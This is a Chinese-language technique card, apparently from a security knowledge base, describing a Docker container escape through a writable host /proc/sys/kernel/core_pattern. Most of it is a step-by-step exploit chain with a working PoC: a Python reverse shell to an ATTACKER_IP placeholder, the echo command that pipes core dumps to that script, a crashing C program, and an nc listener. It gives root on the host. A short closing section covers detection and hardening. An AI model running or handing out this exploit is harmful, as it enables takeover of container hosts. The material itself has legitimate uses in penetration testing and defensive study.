---
id: cloud-container-docker-procfs-core-pattern-escape
title: Docker 挂载宿主机 procfs 时通过 core_pattern 逃逸
type: scenario
domain: cloud
path: cloud/container
technique: docker-procfs-core-pattern-escape
aliases:
- core_pattern 逃逸
- procfs 逃逸
- Docker core dump 逃逸
- /host/proc/sys/kernel/core_pattern
- 容器逃逸 core_pattern
tags:
- docker
- container
- escape
- procfs
- core_pattern
- core-dump
- linux
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:10:32+08:00'
  notes: 已对照原文与图片36-41核对：find 到 /host/proc/sys/kernel/core_pattern，/proc/mounts 取 overlay workdir，写 core_pattern 管道到 merged/tmp/.z.py，编译并运行段错误程序后攻击端收到宿主机 root shell。卡内对绝对路径依赖、|前缀、恢复core_pattern的说明与原文一致。原文未给受影响版本；PoC未本机执行；frontmatter无sources/source_url。
---

## 一句话结论

当宿主机 `/proc`（或 `/proc/sys`）被挂载进容器且容器可写 `/host/proc/sys/kernel/core_pattern` 时，攻击者把 core dump 管道指向容器内恶意脚本在宿主机上的绝对路径，再触发一个崩溃进程；内核会以宿主机 root 执行该脚本，从而逃逸。

## 原理

- `/proc/sys/kernel/core_pattern` 控制 Linux core dump 的写入位置；若以 `|` 开头，内核会把 core dump 通过管道交给指定程序执行，执行身份是触发崩溃的进程所在命名空间的 root（在宿主机视角通常是 root）。
- 容器内若挂载了宿主机 `/proc` 到 `/host/proc`，且该文件可写，攻击者可以修改 `core_pattern`。
- 需要把恶意脚本在**宿主机文件系统**中的绝对路径写入 `core_pattern`，而不是容器内路径；可通过 `/proc/mounts` 中的 overlay `workdir`/`merged` 路径或 `/proc/1/root` 推导容器在宿主机上的目录。
- 触发一个会崩溃的进程（如解引用空指针的 C 程序）后，内核调用 `core_pattern` 指定的脚本，脚本以宿主机 root 执行反弹 shell。
- 该逃逸依赖 procfs 挂载与可写，不需要 `--privileged` 的全部能力，但通常需要 `CAP_SYS_ADMIN` 或宽松的 procfs 权限。

## 触发条件

- 容器内可看到两个 `core_pattern`（如 `/proc/sys/kernel/core_pattern` 与 `/host/proc/sys/kernel/core_pattern`），说明宿主机 procfs 被挂载。
- `/host/proc/sys/kernel/core_pattern` 对容器内用户可写。
- 能确定容器在宿主机上的绝对路径（overlay `merged`/`workdir`、`/proc/1/root` 等）。
- 容器内可编译/运行会崩溃的程序（或已有可触发崩溃的服务）。

## 利用步骤

1. 检测：`find / -name core_pattern`，若出现 `/host/proc/sys/kernel/core_pattern`，确认宿主机 procfs 挂载。
2. 获取容器在宿主机上的路径：`cat /proc/mounts | xargs -d ',' -n 1 | grep workdir`，得到类似 `/var/lib/docker/overlay2/<id>/merged`。
3. 在容器内写反弹 shell 脚本 `/tmp/.z.py`，赋予执行权限。
4. 把 `core_pattern` 改为管道 + 宿主机路径下的脚本：
   `echo -e "|/var/lib/docker/overlay2/<id>/merged/tmp/.z.py \rcore    " > /host/proc/sys/kernel/core_pattern`
5. 编译并运行一个崩溃程序（如空指针解引用），触发 core dump。
6. 攻击者监听端口，接收宿主机 root 反弹 shell。
7. 清理：恢复 `core_pattern`、删除脚本/崩溃程序。

## PoC

检测与路径：

```bash
find / -name core_pattern
# /proc/sys/kernel/core_pattern
# /host/proc/sys/kernel/core_pattern

cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
# workdir=/var/lib/docker/overlay2/<id>/work
# merged 路径通常为 /var/lib/docker/overlay2/<id>/merged
```

反弹脚本：

```python
#!/usr/bin/python3
import os, pty, socket
lhost = "ATTACKER_IP"
lport = 6666
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
os.putenv("HISTFILE", "/dev/null")
pty.spawn("/bin/bash")
```

写入 core_pattern：

```bash
chmod 777 /tmp/.z.py
echo -e "|/var/lib/docker/overlay2/<id>/merged/tmp/.z.py \rcore    " > /host/proc/sys/kernel/core_pattern
```

触发崩溃：

```c
#include <stdio.h>
int main(void) { int *a = NULL; *a = 1; return 0; }
```

```bash
gcc z.c -o z && ./z
```

攻击者监听：

```bash
nc -lvvp 6666
```

## 变体与关联

- 变体：通过 `/proc/1/root` 或 `/proc/<pid>/root` 推导宿主机路径；不同存储驱动（overlay2、aufs、btrfs）路径不同。
- 变体：`core_pattern` 需要以 `|` 开头；部分内核限制管道程序路径长度/参数。
- 变体：也可写 `modprobe_path`、`uevent_helper` 等内核执行路径（需相应写权限），思路类似。
- 关联：[[cloud-container-docker-privileged-host-disk-escape]]（特权容器挂载磁盘）。
- 关联：[[cloud-container-docker-socket-tcp-escape]]（Docker Socket/TCP 逃逸）。
- 注意：修改 `core_pattern` 会影响宿主机所有进程的 core dump，测试后必须恢复；不要在非授权环境操作。

## 检测与防御

- 防御：不要把宿主机 `/proc`/`/proc/sys` 挂载进容器；必须挂载时设为只读，并限制 `CAP_SYS_ADMIN`。
- 防御：宿主机设置 `kernel.core_pattern` 为不可被容器修改的固定值；使用只读 sysctl、userns、seccomp/AppArmor 阻断对 `/proc/sys` 的写。
- 检测：容器内出现 `/host/proc/sys/kernel/core_pattern` 或对 `core_pattern` 的写；`core_pattern` 被改为 `|...`；容器内编译/运行崩溃程序；宿主机出现异常 core dump 管道执行与反弹 shell。
- 响应：恢复 `core_pattern`，删除恶意脚本，检查宿主机 crontab/SSH/账号，审计容器挂载配置。
